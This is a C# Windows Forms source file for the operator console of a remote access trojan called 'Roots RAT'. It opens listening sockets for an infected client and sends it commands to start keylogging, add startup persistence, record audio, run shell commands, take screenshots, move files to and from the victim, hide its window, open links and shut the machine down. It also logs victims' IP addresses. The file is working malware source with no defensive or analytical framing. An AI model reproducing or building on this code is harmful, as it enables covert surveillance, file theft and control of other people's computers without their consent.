using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp7
{
    public partial class Form1 : Form
    {
        public bool Disconnected = false;
        public bool checkedBox1 = false;
        public bool checkedBox2 = false;
        public bool checkedBox3 = false;
        public bool checkedBox4 = false;
        public bool showWindow = false;
        public bool LogData = false;
        public bool buttonClicked = false;
        public bool buttonClicked2 = false;
        public bool ReceivedWinname = false;
        public bool LinkOpened = false;
        public bool ScriptExecuted = false;
        public bool DisconnectExecuted = false;
        public bool selectTab = false;
        public bool selectTab2 = false;
        public bool KeysExecuted = false;
        public bool ServerConnected = false; //17
        public bool Shutdown = false; //17++;
        public bool hideWindow = false; //17++++;
        public bool textToSpeech = false;

        public string ClientName = "";
        public string sendFN = "";
        public string sendVBS = "";

        public int ServerSocket = 0;
        public int setPort = 1604;

        public Form1()
        {
            InitializeComponent();

            Thread.Sleep(10); //sleep to cut down cpu

            textBox2.ScrollBars = ScrollBars.Vertical;
            textBox3.ScrollBars = ScrollBars.Vertical;

            //remove pages
            tabControl2.TabPages.Remove(tabPage7);
            tabControl2.TabPages.Remove(tabPage6);
            tabControl2.TabPages.Remove(tabPage5);
            tabControl2.TabPages.Remove(tabPage1);
            tabControl2.TabPages.Remove(tabPage2);
            tabControl2.TabPages.Remove(tabPage3);
            //end of remove pages

            textBox2.ReadOnly = true;
            textBox3.ReadOnly = true;

            textBox19.Enabled = false;
            textBox18.Enabled = false;
            textBox17.Enabled = false;
            textBox16.Enabled = false;
            textBox12.Enabled = false; //textboxes
            textBox6.Enabled = false;
            textBox8.Enabled = false;
            textBox9.Enabled = false;
            textBox10.Enabled = false;
            textBox11.Enabled = false;

            Thread.Sleep(10); //sleep to cut down cpu

            Task.Factory.StartNew(CheckServerStatus);
        }

        public void Error()
        {
            if (Disconnected == true)
            {
                return;
            }
            else
            {
                Disconnected = true;
                MessageBox.Show("Client has disconnected. Exiting Roots RAT in 5 secounds!", "Roots RAT");
                Thread.Sleep(5000);
                Application.Exit();
            }
        }

        public void CheckServerStatus()
        {
            while (0 < 1)
            {
                Thread.Sleep(30);

                var lines = textBox6.Lines.Count();
                if (lines > 20)
                {
                    Thread.Sleep(10); //sleep to cut down cpu
                    AppendTextBox("clearTextBox6");
                }
            }
        }

        public void AppendTextBox(string value)
        {
            Thread.Sleep(10); //sleep to cut down cpu

            if (InvokeRequired)
            {
                try
                {
                    this.Invoke(new Action<string>(AppendTextBox), new object[] { value });
                    return;
                }
                catch
                {
                    return;
                }
            }

            Thread.Sleep(10); //sleep to cut down cpu

            if (value.Contains("name:"))
            {
                value = value.Replace("name:", "");
                textBox9.Clear();
                textBox9.Text += value;
            }
            else if (value == "closetab")
            {
                tabControl2.TabPages.Remove(tabPage4);
                tabControl2.TabPages.Add(tabPage7);
                tabControl2.SelectedTab = tabPage7;
            }
            else if (value.Contains("version:"))
            {
                value = value.Replace("version:", "");
                textBox16.Text += value + "\r\n";
            }
            else if (value.Contains("appendTo:"))
            {
                value = value.Replace("appendTo:", "");
                textBox6.Text += value + "\r\n";
                textBox19.Text += value + "\r\n";
            }
            else if (value == "disableCheckBox")
            {
                checkBox1.Enabled = false;
                checkBox2.Enabled = false;
                checkBox3.Enabled = false;
                checkBox4.Enabled = false;
            }
            else if (value.Contains("ipAddr:"))
            {
                value = value.Replace("ipAddr:", "");

                textBox12.Clear();

                WebClient client = new WebClient();
                try
                {
                    string ip = client.DownloadString(@"http://icanhazip.com");
                    if (value == ip)
                    {
                        textBox12.Text += "localhost";
                    }
                }
                catch
                {
                    textBox12.Text += value;
                }
            }
            else if (value == "clear:inputCMD")
            {
                textBox1.Clear();
            }
            else if (value == "clear:inputShell")
            {
                textBox4.Clear();
            }
            else if (value == "clear:shell")
            {
                textBox3.Clear();
            }
            else if (value == "clear:cmd")
            {
                textBox2.Clear();
            }
            else if (value.Contains("winname: "))
            {
                value = value.Replace("winname: ", "");
                textBox11.Clear();
                textBox11.Text += value;
            }
            else if (value.Contains("command:"))
            {
                value = value.Replace("command:", "");
                textBox3.Text += value + "\r\n";
            }
            else if (value.Contains("cpu:"))
            {
                value = value.Replace("cpu:", "");
                textBox8.Clear();
                textBox8.Text += value;
            }
            else if (value.Contains("ram:"))
            {
                value = value.Replace("ram:", "");
                textBox10.Clear();
                textBox10.Text += value;
            }
            else if (value == "clearTextBox6")
            {
                textBox6.Clear();
            }
            else if (value == "clearall")
            {
                textBox20.Clear();
                textBox14.Clear();
                textBox13.Clear();
                textBox7.Clear();
                textBox9.Clear();
                textBox6.Clear();
                textBox8.Clear();
                textBox10.Clear();
                textBox11.Clear();
                textBox12.Clear();
                textBox16.Clear();
                textBox17.Clear();
                textBox18.Clear();
            }
            else if (value == "label3")
            {
                label3.Text = "Received connection...";
            }
            else if (value == "performStep")
            {
                progressBar1.Step = 10;
                progressBar1.PerformStep();
            }
            else if (value.Contains("shell:"))
            {
                value = value.Replace("shell:", "");
                textBox2.Text += value + "\r\n" + "\r\n";
            }
            else if (value.Contains("note"))
            {
                value = value.Replace("note:", "");
                textBox17.Text += value;
            }
            else if (value == "addTabs")
            {
                tabControl2.TabPages.Add(tabPage6);
                tabControl2.TabPages.Add(tabPage5);
                tabControl2.TabPages.Add(tabPage1);
                tabControl2.TabPages.Add(tabPage2);
                tabControl2.TabPages.Add(tabPage3);
            }
            else if (value.Contains("machine:"))
            {
                value = value.Replace("machine:", "");
                textBox18.Text += value;
            }
            else if (value == "TabCheck")
            {
                tabControl2.SelectedTab = tabPage6;
                tabControl2.TabPages.Remove(tabPage7);
            }
            else
            {
                Task.Factory.StartNew(Check);
                textBox11.Clear();
                textBox11.Text += value;
            }

            return;
        }

        public void Check()
        {
            if (selectTab == true || selectTab2 == true)
            {
                return;
            }
            else if (selectTab == true || selectTab2 == false)
            {
                AppendTextBox("performStep");
                Thread.Sleep(500);
                AppendTextBox("addTabs");
                AppendTextBox("TabCheck");
                selectTab2 = true;
                return;
            }
            else
            {
                selectTab = true;
                return;
            }
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox6_TextChanged(object sender, EventArgs e)
        {

        }

        private void button5_Click(object sender, EventArgs e)
        {

        }

        private void textBox7_TextChanged(object sender, EventArgs e)
        {

        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            DialogResult result = MessageBox.Show("Are you sure?", "Roots RAT", MessageBoxButtons.YesNo);

            if (result == DialogResult.Yes)
            {
                Application.Exit();
            }
            else if (result == DialogResult.No)
            {
                return;
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            if (checkBox1.Checked == true)
            {
                checkedBox1 = true;
            }

            if (checkBox2.Checked == true)
            {
                checkedBox2 = true;
            }

            if (checkBox3.Checked == true)
            {
                checkedBox3 = true;
            }

            if (checkBox4.Checked == true)
            {
                checkedBox4 = true;
            }

            string text = textBox5.Text;

            try
            {
                setPort = Convert.ToInt32(text);
            }
            catch
            {

            }
            //split
            Thread.Sleep(100); //sleep to cut down cpu

            AppendTextBox("closetab");

            Task.Factory.StartNew(StartShellServer);
            Task.Factory.StartNew(StartCmdServer);
            Task.Factory.StartNew(StartServer);
        }

        public void StartServer()
        {
            string logData = "";
            Thread.Sleep(10); //sleep to cut down cpu

            IPEndPoint ipEnd = new IPEndPoint(IPAddress.Any, setPort);
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);

            sock.Bind(ipEnd);
            sock.Listen(100);

            Thread.Sleep(10); //sleep to cut down cpu

            Socket clientSock = sock.Accept();

            AppendTextBox("label3");

            try
            {
                //name
                byte[] ClientBuffer = new byte[1024];
                int ClientData = clientSock.Receive(ClientBuffer);
                char[] ClientChars = new char[ClientData];

                System.Text.Decoder ClientDecode = System.Text.Encoding.UTF8.GetDecoder();
                int ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                string ClientName = new string(ClientChars);

                AppendTextBox("name:" + ClientName);

                AppendTextBox("appendTo:" + DateTime.Now + ": Received name");

                if (checkedBox4 == true) //check and write
                {
                    logData = "Time of connect: " + DateTime.Now + "\r\n" + "Client's IP address: " + clientSock.RemoteEndPoint + "\r\nClient name: " + ClientName + "\r\n";
                }
                //name

                AppendTextBox("performStep");
                Thread.Sleep(50);

                //version
                ClientData = clientSock.Receive(ClientBuffer);
                ClientChars = new char[ClientData];

                ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                ClientName = new string(ClientChars);

                AppendTextBox("version:" + ClientName);

                AppendTextBox("appendTo:" + DateTime.Now + ": Received client version");
                //version

                AppendTextBox("performStep");

                //note
                ClientData = clientSock.Receive(ClientBuffer);
                ClientChars = new char[ClientData];

                ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                ClientName = new string(ClientChars);

                AppendTextBox(ClientName);

                AppendTextBox("appendTo:" + DateTime.Now + ": Received note");
                //note

                AppendTextBox("performStep");

                //machine
                ClientData = clientSock.Receive(ClientBuffer);
                ClientChars = new char[ClientData];

                ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                ClientName = new string(ClientChars);

                AppendTextBox(ClientName);

                AppendTextBox("appendTo:" + DateTime.Now + ": Received machine name");
                //machine

                AppendTextBox("performStep");
                Thread.Sleep(50);

                //ip
                ClientData = clientSock.Receive(ClientBuffer);
                ClientChars = new char[ClientData];

                ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                ClientName = new string(ClientChars);

                AppendTextBox("ipAddr:" + ClientName);
                //ip

                AppendTextBox("performStep");
                Thread.Sleep(50);

                //final split

                if (checkedBox4 == true) //check and write, FINAL
                {
                    string path = @"C:\Users\" + Environment.UserName + @"\rootsLOG.txt";

                    if (!File.Exists(path))
                    {
                        var Create = File.Create(path);
                        Create.Close();
                    }

                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.WriteLine(logData + "\n");
                    }
                }

                //final split end

                AppendTextBox("performStep");
                Thread.Sleep(50);

                //keylog and startup
                byte[] ClientData1 = System.Text.Encoding.ASCII.GetBytes("keylog = false");
                if (checkBox1.Checked == true)
                {
                    ClientData1 = System.Text.Encoding.ASCII.GetBytes("keylog = true");
                }
                clientSock.Send(ClientData1);
                KeysExecuted = true;

                AppendTextBox("appendTo:" + DateTime.Now + ": Checked key logging request");
                //split
                AppendTextBox("performStep");
                //split
                byte[] StartupData = System.Text.Encoding.ASCII.GetBytes("startup = false");
                if (checkBox2.Checked == true)
                {
                    StartupData = System.Text.Encoding.ASCII.GetBytes("startup = true");
                }
                clientSock.Send(StartupData);

                AppendTextBox("appendTo:" + DateTime.Now + ": Checked startup request");
                //keylog and startup

                AppendTextBox("performStep");

                //audio
                byte[] Audio = System.Text.Encoding.ASCII.GetBytes("audio = false");
                if (checkBox3.Checked == true)
                {
                    Audio = System.Text.Encoding.ASCII.GetBytes("audio = true");
                }
                clientSock.Send(Audio);

                AppendTextBox("appendTo:" + DateTime.Now + ": Checked audio request");
                //audio

                AppendTextBox("performStep");

                AppendTextBox("appendTo:" + DateTime.Now + ": Starting to receive system information");

                Thread.Sleep(10); //sleep to cut down cpu
            }
            catch
            {
                Error();
            }

            //split

            AppendTextBox("appendTo:" + DateTime.Now + ": Client is benchmarking system");

            int count = 0;

            while (0 < 1)
            {
                try
                {
                    byte[] ClientBuffer2 = new byte[1024];
                    int ClientData2 = clientSock.Receive(ClientBuffer2);
                    char[] ClientChars2 = new char[ClientData2];

                    System.Text.Decoder ClientDecode2 = System.Text.Encoding.UTF8.GetDecoder();
                    int ClientCharLen2 = ClientDecode2.GetChars(ClientBuffer2, 0, ClientData2, ClientChars2, 0);
                    string ClientName2 = new string(ClientChars2);

                    count++;
                    if (count == 25)
                    {
                        count = 0;
                        AppendTextBox("appendTo:" + DateTime.Now + ": Received system information");
                    }
                    AppendTextBox(ClientName2);

                    Thread.Sleep(666);
                }
                catch
                {
                    Thread.Sleep(10); //sleep to cut down cpu
                    AppendTextBox("clearall");
                    Error();
                }
            }
        }

        private void tabPage6_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void textBox12_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox9_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox8_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox10_TextChanged(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void textBox11_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox5_TextChanged(object sender, EventArgs e)
        {

        }

        private void progressBar3_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }

        public void StartCmdServer()
        {
            Thread.Sleep(10); //sleep to cut down cpu

            IPEndPoint ipEnd = new IPEndPoint(IPAddress.Any, setPort + 1);
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);

            sock.Bind(ipEnd);
            sock.Listen(100);

            Socket clientSock = sock.Accept();

            Thread.Sleep(10); //sleep to cut down cpu

            while (0 < 1)
            {
                try
                {
                    Thread.Sleep(10); //sleep to cut down cpu

                    if (buttonClicked2 == true)
                    {
                        buttonClicked2 = false;

                        string text = textBox4.Text;
                        byte[] ClientData1 = System.Text.Encoding.ASCII.GetBytes(textBox4.Text);

                        if (text == "log keys")
                        {
                            if (KeysExecuted == true)
                            {
                                MessageBox.Show("Client has already executed key logger!", "Roots RAT");
                                ClientData1 = System.Text.Encoding.ASCII.GetBytes("!log keys");
                            }
                        }

                        clientSock.Send(ClientData1); //send

                        byte[] ClientBuffer = new byte[1024 * 5]; //receive2, 2/ mucho y grande XXL buff

                        if ((text == "recover log") || (text.Contains("ls ")) || (text == "processesKB") || (text == "processesMB"))
                        {
                            ClientBuffer = new byte[1024 * 30];
                        }

                        System.Text.Decoder ClientDecode = System.Text.Encoding.UTF8.GetDecoder();

                        int ClientData = clientSock.Receive(ClientBuffer);
                        char[] ClientChars = new char[ClientData];
                        int ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                        string ClientName = new string(ClientChars);

                        //check output
                        if (text.Contains("screenshot "))
                        {
                            byte[] clientData = new byte[1024 * 5000];
                            string receivedPath = @"C:\Users\" + Environment.UserName + @"\";

                            if (File.Exists(receivedPath + "winlog.png"))
                            {
                                File.Delete(receivedPath + "winlog.png");
                            }

                            int receivedBytesLen = clientSock.Receive(clientData);

                            int fileNameLen = BitConverter.ToInt32(clientData, 0);
                            string fileName = Encoding.ASCII.GetString(clientData, 4, fileNameLen);

                            BinaryWriter bWriter = new BinaryWriter(File.Open(receivedPath + fileName, FileMode.Append));
                            bWriter.Write(clientData, 4 + fileNameLen, receivedBytesLen - 4 - fileNameLen);
                            bWriter.Close();

                            try
                            {
                                Process.Start(receivedPath + fileName);
                            }
                            catch
                            {
                                MessageBox.Show("Receiving file failed!", "Roots RAT");
                            }
                        }

                        if (text.Contains("dl "))
                        {
                            byte[] clientData = new byte[1024 * 9000];
                            string receivedPath = @"C:\Users\" + Environment.UserName + @"\";

                            int receivedBytesLen = clientSock.Receive(clientData);
                            int fileNameLen = BitConverter.ToInt32(clientData, 0);
                            string fileName = Encoding.ASCII.GetString(clientData, 4, fileNameLen);

                            BinaryWriter bWrite = new BinaryWriter(File.Open(receivedPath + fileName, FileMode.Append));
                            bWrite.Write(clientData, 4 + fileNameLen, receivedBytesLen - 4 - fileNameLen);
                            bWrite.Close();
                        }

                        if (text.Contains("sendFN "))
                        {
                            text = text.Replace("sendFN ", "");
                            sendFN = text;
                        }

                        if (text.Contains("send "))
                        {
                            text = text.Replace("send ", "");

                            if (File.Exists(text + sendFN))
                            {
                                string fileName = sendFN;
                                string filePath = text;
                                if (File.Exists(filePath + fileName))
                                {
                                    byte[] fileNameByte = Encoding.ASCII.GetBytes(fileName);
                                    byte[] fileData = File.ReadAllBytes(filePath + fileName);
                                    byte[] clientData = new byte[4 + fileNameByte.Length + fileData.Length];
                                    byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);

                                    fileNameLen.CopyTo(clientData, 0);
                                    fileNameByte.CopyTo(clientData, 4);
                                    fileData.CopyTo(clientData, 4 + fileNameByte.Length);
                                    clientSock.Send(clientData);
                                }
                            }
                        }
                        //check output

                        Thread.Sleep(10); //sleep to cut down cpu

                        AppendTextBox("command:" + ClientName);
                    }
                }
                catch
                {
                    Thread.Sleep(10); //sleep to cut down cpu
                    AppendTextBox("clearall");
                    Error();
                }
            }
        }

        public void StartShellServer()
        {
            Thread.Sleep(10); //sleep to cut down cpu

            IPEndPoint ipEnd = new IPEndPoint(IPAddress.Any, setPort + 2);
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);

            sock.Bind(ipEnd);
            sock.Listen(100);

            Socket clientSock = sock.Accept();

            Thread.Sleep(10); //sleep to cut down cpu

            byte[] ClientData1 = System.Text.Encoding.ASCII.GetBytes("miscCMD:" + "VBS:" + sendVBS);
            clientSock.Send(ClientData1);
            //split
            byte[] ClientBuffer = new byte[1024 * 5];
            int ClientData = clientSock.Receive(ClientBuffer);
            char[] ClientChars = new char[ClientData];

            System.Text.Decoder ClientDecode = System.Text.Encoding.UTF8.GetDecoder();
            int ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
            string ClientName = new string(ClientChars);

            while (0 < 1)
            {
                Thread.Sleep(10); //sleep to cut down cpu

                try
                {
                    if (ScriptExecuted == true)
                    {
                        ClientData1 = System.Text.Encoding.ASCII.GetBytes("miscCMD:" + "VBS:" + sendVBS);
                        clientSock.Send(ClientData1);
                        //split
                        ClientBuffer = new byte[1024 * 5];
                        ClientData = clientSock.Receive(ClientBuffer);
                        ClientChars = new char[ClientData];

                        ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                        ClientName = new string(ClientChars);

                        Thread.Sleep(10); //sleep to cut down cpu

                        MessageBox.Show(ClientName, "Roots RAT");
                        ScriptExecuted = false;
                    }
                    else if (Shutdown == true)
                    {
                        ClientData1 = System.Text.Encoding.ASCII.GetBytes("shutdown");
                        clientSock.Send(ClientData1);
                        //split
                        ClientBuffer = new byte[1024 * 5];
                        ClientData = clientSock.Receive(ClientBuffer);
                        ClientChars = new char[ClientData];

                        ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                        ClientName = new string(ClientChars);

                        Thread.Sleep(10); //sleep to cut down cpu

                        MessageBox.Show(ClientName, "Roots RAT");
                        Shutdown = false;
                    }
                    else if (textToSpeech == true)
                    {
                        ClientData1 = System.Text.Encoding.ASCII.GetBytes("speak:" + textBox20.Text);
                        clientSock.Send(ClientData1);

                        ClientBuffer = new byte[1024 * 5];
                        ClientData = clientSock.Receive(ClientBuffer);
                        ClientChars = new char[ClientData];

                        ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                        ClientName = new string(ClientChars);

                        MessageBox.Show(ClientName, "Roots RAT");

                        textToSpeech = false;
                    }
                    else if (hideWindow == true)
                    {
                        ClientData1 = System.Text.Encoding.ASCII.GetBytes("hide:window");
                        clientSock.Send(ClientData1);
                        hideWindow = false;
                    }
                    else if (showWindow == true)
                    {
                        ClientData1 = System.Text.Encoding.ASCII.GetBytes("show:window");
                        clientSock.Send(ClientData1);
                        showWindow = false;
                    }
                    else if (LinkOpened == true)
                    {
                        string linkText = textBox14.Text;

                        ClientData1 = System.Text.Encoding.ASCII.GetBytes("link:" + linkText);
                        clientSock.Send(ClientData1);
                        //split
                        ClientBuffer = new byte[1024 * 5];
                        ClientData = clientSock.Receive(ClientBuffer);
                        ClientChars = new char[ClientData];

                        ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                        ClientName = new string(ClientChars);

                        Thread.Sleep(10); //sleep to cut down cpu

                        MessageBox.Show(ClientName, "Roots RAT");

                        LinkOpened = false;

                    }
                    else if (DisconnectExecuted == true)
                    {
                        ClientData1 = System.Text.Encoding.ASCII.GetBytes("disconnect");
                        clientSock.Send(ClientData1);
                        //split
                        ClientBuffer = new byte[1024 * 5];
                        ClientData = clientSock.Receive(ClientBuffer);
                        ClientChars = new char[ClientData];

                        ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                        ClientName = new string(ClientChars);

                        Thread.Sleep(10); //sleep to cut down cpu

                        MessageBox.Show(ClientName, "Roots RAT");
                        DisconnectExecuted = false;
                    }
                    else
                    {
                        try
                        {
                            Thread.Sleep(10); //sleep to cut down cpu

                            if (buttonClicked == true)
                            {
                                buttonClicked = false;

                                ClientData1 = System.Text.Encoding.ASCII.GetBytes(textBox1.Text);
                                clientSock.Send(ClientData1);

                                ClientBuffer = new byte[1024 * 5];
                                ClientData = clientSock.Receive(ClientBuffer);
                                ClientChars = new char[ClientData];

                                ClientCharLen = ClientDecode.GetChars(ClientBuffer, 0, ClientData, ClientChars, 0);
                                ClientName = new string(ClientChars);

                                Thread.Sleep(10); //sleep to cut down cpu

                                AppendTextBox("shell:" + ClientName);
                            }
                        }
                        catch
                        {
                            Thread.Sleep(10); //sleep to cut down cpu

                            return;
                        }
                    }
                }
                catch
                {
                    Thread.Sleep(10); //sleep to cut down cpu
                    AppendTextBox("clearall");
                    Error();
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            buttonClicked = true;
        }

        private void textBox2_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged_2(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            buttonClicked2 = true;
        }

        private void textBox4_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void button5_Click_1(object sender, EventArgs e)
        {

        }

        private void button7_Click(object sender, EventArgs e)
        {

        }

        private void textBox5_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void button2_Click_1(object sender, EventArgs e)
        {

        }

        private void textBox6_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void textBox6_TextChanged_2(object sender, EventArgs e)
        {

        }

        private void textBox7_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void textBox7_TextChanged_2(object sender, EventArgs e)
        {

        }

        private void textBox12_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void comboBox1_SelectedIndexChanged_1(object sender, EventArgs e)
        {

        }

        private void button2_Click_2(object sender, EventArgs e)
        {
            AppendTextBox("clear:cmd");
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            AppendTextBox("clear:shell");
        }

        private void button8_Click(object sender, EventArgs e)
        {

        }

        private void button9_Click(object sender, EventArgs e)
        {
            DisconnectExecuted = true;
        }

        private void button10_Click(object sender, EventArgs e)
        {

        }

        private void button12_Click(object sender, EventArgs e)
        {
            AppendTextBox("clear:inputCMD");
        }

        private void button13_Click(object sender, EventArgs e)
        {
            AppendTextBox("clear:inputShell");
        }

        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {

        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void label2_Click_1(object sender, EventArgs e)
        {

        }

        private void checkBox2_CheckedChanged_1(object sender, EventArgs e)
        {

        }

        private void progressBar1_Click(object sender, EventArgs e)
        {

        }

        private void button8_Click_1(object sender, EventArgs e)
        {

        }

        private void button8_Click_3(object sender, EventArgs e)
        {

        }

        private void notifyIcon1_MouseDoubleClick_1(object sender, MouseEventArgs e)
        {

        }

        private void textBox6_TextChanged_3(object sender, EventArgs e)
        {

        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void textBox12_TextChanged_2(object sender, EventArgs e)
        {

        }

        private void button9_Click_1(object sender, EventArgs e)
        {
            DisconnectExecuted = true;
        }

        private void checkBox4_CheckedChanged_1(object sender, EventArgs e)
        {

        }

        private void dataGridView1_CellContentClick_1(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void listView1_SelectedIndexChanged_1(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button5_Click_2(object sender, EventArgs e)
        {

        }

        private void button5_Click_3(object sender, EventArgs e)
        {

        }

        private void button7_Click_1(object sender, EventArgs e)
        {

        }

        private void button9_Click_2(object sender, EventArgs e)
        {
            DisconnectExecuted = true;
        }

        private void button5_Click_4(object sender, EventArgs e)
        {
            if (File.Exists(@"C:\Users\" + Environment.UserName + @"\rootsLOG.txt"))
            {
                Form2 form = new Form2();
                form.Show();
            }
            else
            {
                MessageBox.Show("Log file doesn't exits, you can create it by applying server side logging on the next use of Roots RAT.", "Roots RAT");
            }
        }

        private void textBox12_TextChanged_3(object sender, EventArgs e)
        {

        }

        private void button7_Click_2(object sender, EventArgs e)
        {
            string text7 = textBox7.Text;
            string text13 = textBox13.Text;

            sendVBS = "X = MsgBox(" + "\"" + text13 + "\"" + " ,48, " + "\"" + text7 + "\"" + ")";
            ScriptExecuted = true;
        }

        private void textBox7_TextChanged_3(object sender, EventArgs e)
        {

        }

        private void textBox13_TextChanged(object sender, EventArgs e)
        {

        }

        private void button9_Click_3(object sender, EventArgs e)
        {
            DialogResult result = MessageBox.Show("Are you sure?", "Roots RAT", MessageBoxButtons.YesNo);

            if (result == DialogResult.Yes)
            {
                DisconnectExecuted = true;
            }
        }

        private void button10_Click_1(object sender, EventArgs e)
        {

        }

        private void button10_Click_2(object sender, EventArgs e)
        {
            string text = textBox14.Text;
            if (text.Contains("http://"))
            {
                textBox14.Text = text.Replace("http://", "");
            }
            LinkOpened = true;
        }

        private void textBox14_TextChanged(object sender, EventArgs e)
        {

        }

        private void button11_Click(object sender, EventArgs e)
        {
            DialogResult result = MessageBox.Show("Are you sure?", "Roots RAT", MessageBoxButtons.YesNo);

            if (result == DialogResult.Yes)
            {
                if (button11.Text == "Show window")
                {
                    button11.Text = "Hide window";

                    showWindow = true;
                    hideWindow = false;
                }
                else
                {
                    button11.Text = "Show window";

                    showWindow = false;
                    hideWindow = true;
                }
            }
        }

        private void button12_Click_1(object sender, EventArgs e)
        {

        }

        private void button12_Click_2(object sender, EventArgs e)
        {

        }

        private void button12_Click_3(object sender, EventArgs e)
        {
            string path = @"C:\Users\" + Environment.UserName + @"\rootsLOG.txt";

            if (File.Exists(path))
            {
                try
                {
                    File.Delete(path);
                    MessageBox.Show("Deleted log file!", "Roots RAT");
                }
                catch
                {
                    MessageBox.Show("Could not delete log file!", "Roots RAT");

                }
            }
            else
            {
                MessageBox.Show("Log file doesn't exits, you can create it by applying server side logging on the next use of Roots RAT.", "Roots RAT");
            }
        }

        private void button13_Click_1(object sender, EventArgs e)
        {
            string path = @"C:\Users\" + Environment.UserName + @"\rootsLOG.txt";
            string text = textBox15.Text;

            if (File.Exists(path))
            {
                try
                {
                    using (StreamWriter sw = File.AppendText(path))
                    {
                        sw.WriteLine("Note: " + text + "\n");
                    }

                    MessageBox.Show("Successfully added note to log!", "Roots RAT");
                }
                catch
                {
                    MessageBox.Show("Could not write note to log!", "Roots RAT");
                }
            }
            else
            {
                MessageBox.Show("Log file doesn't exits, you can create it by applying server side logging on the next use of Roots RAT.", "Roots RAT");
            }
        }

        private void textBox15_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox16_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox18_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox17_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox19_TextChanged(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void tabPage7_Click(object sender, EventArgs e)
        {

        }

        private void progressBar1_Click_1(object sender, EventArgs e)
        {

        }

        private void button8_Click_2(object sender, EventArgs e)
        {
            DialogResult result = MessageBox.Show("Are you sure?", "Roots RAT", MessageBoxButtons.YesNo);

            if (result == DialogResult.Yes)
            {
                Shutdown = true;
            }
        }

        private void button14_Click(object sender, EventArgs e)
        {
            DialogResult result = MessageBox.Show("Are you sure?", "Roots RAT", MessageBoxButtons.YesNo);

            if (result == DialogResult.Yes)
            {
                hideWindow = true;
            }
        }

        private void button14_Click_1(object sender, EventArgs e)
        {
            textToSpeech = true;
        }

        private void textBox20_TextChanged(object sender, EventArgs e)
        {

        }
    }
}